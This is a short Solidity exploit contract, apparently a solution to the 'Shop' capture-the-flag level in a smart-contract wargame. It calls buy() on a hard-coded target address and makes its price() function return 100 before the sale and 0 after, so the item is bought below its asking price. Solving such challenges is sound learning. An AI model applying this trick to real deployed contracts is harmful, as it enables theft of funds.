pragma solidity ^0.6;

abstract contract Shop {
    bool public isSold;
	function buy() external virtual;
}

contract expl {
    Shop public lol;
      // same as the Elevator challenge
	function pwn() public {
		lol = Shop(0xd822C2B1a3A7118Eea0ECFD37a4470bde93DC523);
		lol.buy();
	}
	function price() external view returns (uint) {
		return lol.isSold() ? 0 : 100;
	}
}
